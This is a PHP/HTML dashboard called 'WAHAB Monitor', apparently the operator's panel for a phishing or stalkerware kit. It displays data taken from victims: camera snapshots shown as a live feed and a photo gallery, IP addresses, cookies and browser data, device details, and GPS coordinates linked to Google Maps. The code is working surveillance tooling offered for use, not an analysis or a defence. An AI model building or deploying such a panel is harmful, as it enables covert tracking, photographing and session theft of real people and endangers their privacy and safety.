<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WAHAB Monitor Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%); 
            color: #e0e0e0; 
            padding: 20px; 
        }
        h1 { 
            text-align: center; 
            color: #00ff88; 
            text-shadow: 0 0 20px rgba(0,255,136,0.5);
            margin-bottom: 10px;
            font-size: 2.5em;
        }
        .subtitle {
            text-align: center;
            color: #888;
            margin-bottom: 30px;
            font-size: 0.9em;
        }
        .container { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); 
            gap: 20px; 
            max-width: 1600px;
            margin: 0 auto;
        }
        .card { 
            background: rgba(30, 30, 30, 0.9); 
            border: 1px solid #333; 
            border-radius: 12px; 
            padding: 20px; 
            box-shadow: 0 8px 16px rgba(0,0,0,0.4);
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 24px rgba(0,255,136,0.2);
        }
        .card h2 { 
            border-bottom: 2px solid #00ff88; 
            padding-bottom: 10px; 
            margin-bottom: 15px;
            color: #00ff88; 
            font-size: 1.3em;
        }
        pre { 
            background-color: #0a0a0a; 
            padding: 15px; 
            border-radius: 6px; 
            overflow-x: auto; 
            white-space: pre-wrap; 
            max-height: 300px; 
            overflow-y: auto; 
            color: #00ff00; 
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 0.85em;
            line-height: 1.5;
        }
        .gallery { 
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            gap: 10px; 
            max-height: 400px; 
            overflow-y: auto; 
        }
        .gallery img { 
            width: 100%; 
            height: 120px;
            object-fit: cover;
            border: 2px solid #333; 
            border-radius: 6px; 
            transition: all 0.3s; 
            cursor: pointer;
        }
        .gallery img:hover { 
            transform: scale(1.05); 
            border-color: #00ff88; 
            box-shadow: 0 0 20px rgba(0,255,136,0.5);
        }
        .refresh-btn { 
            display: block; 
            margin: 0 auto 30px; 
            padding: 12px 40px; 
            background: linear-gradient(135deg, #00ff88 0%, #00cc6a 100%);
            color: #0a0a0a; 
            border: none; 
            border-radius: 25px; 
            cursor: pointer; 
            font-size: 16px;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(0,255,136,0.3);
            transition: all 0.3s;
        }
        .refresh-btn:hover { 
            background: linear-gradient(135deg, #00cc6a 0%, #00ff88 100%);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0,255,136,0.5);
        }
        .live-video {
            width: 100%;
            max-height: 400px;
            background: #000;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #666;
        }
        .live-video img {
            width: 100%;
            height: auto;
            border-radius: 6px;
        }
        .status-badge {
            display: inline-block;
            padding: 4px 12px;
            background: #00ff88;
            color: #0a0a0a;
            border-radius: 12px;
            font-size: 0.75em;
            font-weight: bold;
            margin-left: 10px;
        }
        .cookies-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        .cookies-table td {
            padding: 8px;
            border-bottom: 1px solid #333;
            color: #aaa;
        }
        .cookies-table td:first-child {
            color: #00ff88;
            font-weight: bold;
            width: 30%;
        }
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #1a1a1a;
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb {
            background: #00ff88;
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #00cc6a;
        }
    </style>
    <script>
        setInterval(() => {
            // Reload only the dynamic content, not the entire page
            location.reload();
        }, 3000); // Auto-refresh every 3 seconds
    </script>
</head>
<body>
    <h1>🛰️ WAHAB MONITOR</h1>
    <div class="subtitle">Real-Time Surveillance Dashboard | Auto-refresh: 3s</div>
    <button class="refresh-btn" onclick="window.location.reload()">🔄 Manual Refresh</button>
    
    <div class="container">
        <!-- Live Video Feed -->
        <div class="card">
            <h2>📹 Live Camera Feed<span class="status-badge">LIVE</span></h2>
            <div class="live-video">
                <?php 
                    $images = glob("*.png");
                    if ($images) {
                        rsort($images); // Newest first
                        echo "<img src='{$images[0]}?t=" . time() . "' alt='Live Feed'>";
                    } else {
                        echo "<p style='color:#666'>Waiting for camera activation...</p>";
                    }
                ?>
            </div>
        </div>

        <!-- IP Addresses -->
        <div class="card">
            <h2>🌍 IP Addresses</h2>
            <pre><?php 
                $ipData = '';
                if (file_exists('saved.ip.txt')) {
                    $ipData .= file_get_contents('saved.ip.txt');
                }
                if (file_exists('ip.txt')) {
                    $ipData .= file_get_contents('ip.txt');
                }
                echo $ipData ? htmlspecialchars($ipData) : 'No IP data captured yet...';
            ?></pre>
        </div>

        <!-- Cookies & Browser Data -->
        <div class="card">
            <h2>🍪 Cookies & Browser Data</h2>
            <pre><?php 
                if (file_exists('device_info.txt')) {
                    $deviceData = file_get_contents('device_info.txt');
                    echo htmlspecialchars($deviceData);
                } else {
                    echo 'No cookies captured yet...';
                }
            ?></pre>
        </div>

        <!-- Device Information -->
        <div class="card">
            <h2>📱 Device Details</h2>
            <pre><?php 
                if (file_exists('device_info.txt')) {
                    echo htmlspecialchars(file_get_contents('device_info.txt'));
                } else {
                    echo 'No device data yet...';
                }
            ?></pre>
        </div>

        <!-- GPS Location -->
        <div class="card">
            <h2>📍 GPS Coordinates</h2>
            <pre><?php 
                $locFiles = glob("saved_locations/*.txt");
                if ($locFiles) {
                    rsort($locFiles); // Newest first
                    foreach($locFiles as $file) {
                        echo "📌 " . basename($file) . "\n";
                        $content = file_get_contents($file);
                        echo htmlspecialchars($content) . "\n";
                        
                        // Extract coordinates for Google Maps link
                        if (preg_match('/Latitude:\s*([-\d.]+)/', $content, $lat) && 
                            preg_match('/Longitude:\s*([-\d.]+)/', $content, $lon)) {
                            echo "🗺️  Google Maps: https://www.google.com/maps?q={$lat[1]},{$lon[1]}\n";
                        }
                        echo str_repeat("-", 50) . "\n\n";
                    }
                } else {
                    echo file_exists('saved.locations.txt') ? htmlspecialchars(file_get_contents('saved.locations.txt')) : 'No location data yet...'; 
                }
            ?></pre>
        </div>

        <!-- Captured Photos Gallery -->
        <div class="card">
            <h2>📸 Photo Gallery (<?php echo count(glob("*.png")); ?> images)</h2>
            <div class="gallery">
                <?php 
                    $images = glob("*.png");
                    if ($images) {
                        rsort($images); // Newest first
                        foreach($images as $image) {
                            echo "<a href='$image' target='_blank'><img src='$image' alt='Captured' title='" . basename($image) . "'></a>";
                        }
                    } else {
                        echo "<p style='color:#666; padding:20px'>No images captured yet.</p>";
                    }
                ?>
            </div>
        </div>
    </div>
</body>
</html>
